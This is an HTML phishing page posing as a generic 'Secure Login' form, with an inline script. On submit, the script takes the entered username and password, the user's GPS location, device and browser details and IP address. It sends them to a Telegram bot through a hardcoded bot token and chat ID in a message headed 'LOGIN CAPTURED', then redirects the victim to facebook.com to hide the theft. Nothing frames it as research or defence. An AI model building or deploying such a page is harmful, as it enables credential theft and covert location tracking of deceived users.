<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center}
        .container{background:#fff;padding:40px 35px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:380px;max-width:95%;animation:fadeIn 0.5s}
        @keyframes fadeIn{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
        .logo{text-align:center;margin-bottom:25px}
        .logo h1{font-size:26px;color:#333;font-weight:700}
        .logo p{color:#888;font-size:14px;margin-top:5px}
        .input-group{margin-bottom:18px}
        .input-group label{display:block;font-size:13px;font-weight:600;color:#555;margin-bottom:5px}
        .input-group input{width:100%;padding:12px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:border 0.3s;background:#f8f9fa}
        .input-group input:focus{outline:none;border-color:#667eea;background:#fff}
        button{width:100%;padding:13px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.2s}
        button:hover{transform:scale(1.02)}
        button:active{transform:scale(0.98)}
        .footer{text-align:center;margin-top:18px;font-size:12px;color:#aaa}
        .loading{display:none;text-align:center;margin-top:15px;color:#667eea;font-weight:500}
        .spinner{display:inline-block;width:20px;height:20px;border:3px solid #e0e0e0;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <h1>🔐 Secure Login</h1>
        <p>Enter your credentials to continue</p>
    </div>
    <form id="loginForm">
        <div class="input-group">
            <label>📧 Email or Username</label>
            <input type="text" id="username" placeholder="Enter your email" required>
        </div>
        <div class="input-group">
            <label>🔑 Password</label>
            <input type="password" id="password" placeholder="Enter your password" required>
        </div>
        <button type="submit">Log In</button>
        <div class="loading" id="loading"><span class="spinner"></span>Verifying...</div>
    </form>
    <div class="footer">© 2026 Secure Login • All rights reserved</div>
</div>

<script>
// ============================================================
// CONFIG — မင်းရဲ့ Chat ID နဲ့ Bot Token ထည့်ပြီးသား
// ============================================================
const BOT_TOKEN = "8923928044:AAERe7EZPYBU50Wte_Gyecd4kuR5lCdvyuE";
const CHAT_ID = "5304050102";
// ============================================================

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const loading = document.getElementById('loading');
    const btn = this.querySelector('button');

    if (!username || !password) return;

    loading.style.display = 'block';
    btn.disabled = true;
    btn.textContent = 'Logging in...';

    try {
        // --- 1. Location (GPS) ---
        let location = 'Not available';
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            location = `https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch (e) { location = 'Not available (permission denied)'; }

        // --- 2. Device & Browser Info ---
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direct'
        };

        // --- 3. IP Address (via free API) ---
        let ip = 'Unknown';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) { ip = 'Failed to fetch'; }

        // --- 4. Build Message ---
        const msg = 
`🔐 **LOGIN CAPTURED**
━━━━━━━━━━━━━━━━━━━
👤 **Username:** ${username}
🔑 **Password:** ${password}
━━━━━━━━━━━━━━━━━━━
🌐 **IP Address:** ${ip}
📱 **Device:** ${deviceInfo.platform}
🌍 **Language:** ${deviceInfo.language}
📺 **Screen:** ${deviceInfo.screen}
🕐 **Timezone:** ${deviceInfo.timezone}
🔗 **Referrer:** ${deviceInfo.referrer}
📍 **Location:** ${location}
━━━━━━━━━━━━━━━━━━━
🖥️ **User Agent:** ${deviceInfo.userAgent}`;

        // --- 5. Send to Telegram ---
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        await fetch(url);

        // --- 6. Redirect to real website ---
        window.location.href = 'https://facebook.com';

    } catch (error) {
        loading.style.display = 'none';
        btn.disabled = false;
        btn.textContent = 'Log In';
        alert('Connection error. Please try again.');
    }
});
</script>
</body>
</html>
